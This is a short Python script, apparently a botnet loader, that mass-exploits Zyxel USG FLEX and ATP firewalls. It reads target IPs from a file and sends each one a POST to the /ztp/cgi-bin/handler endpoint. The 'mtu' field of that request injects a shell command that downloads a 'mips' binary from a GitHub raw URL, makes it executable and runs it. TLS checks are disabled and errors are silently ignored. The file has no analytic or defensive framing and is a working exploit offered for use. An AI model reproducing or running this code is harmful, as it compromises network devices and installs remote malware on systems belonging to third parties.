from requests.packages.urllib3.exceptions import InsecureRequestWarning
import threading, sys, requests, json

# title:"USG FLEX 100","USG FLEX 100w","USG FLEX 200","USG FLEX 500","USG FLEX 700","USG FLEX 50","USG FLEX 50w","ATP100","ATP200","ATP500","ATP700"

ips = open(sys.argv[1], "r").readlines()
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0",
    "Content-Type": "application/json",
}
data = {
    "command": "setWanPortSt",
    "proto": "dhcp",
    "port": "4",
    "vlan_tagged": "1",
    "vlanid": "5",
    "mtu": f'; bash -c "cd /tmp;wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips;chmod 777 mips;./mips;";',
    "data": "hi",
}

class xyxel(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
				print (f"[ZyxelV2] Loading: {self.ip}")
				url = "https://" + self.ip + "/ztp/cgi-bin/handler"
				requests.post(url, timeout=5, headers=headers, data=json.dumps(data), verify=False)
			except Exception as e:
				pass

for ip in ips:
	try:
		n = xyxel(ip)
		n.start()
	except:
		pass
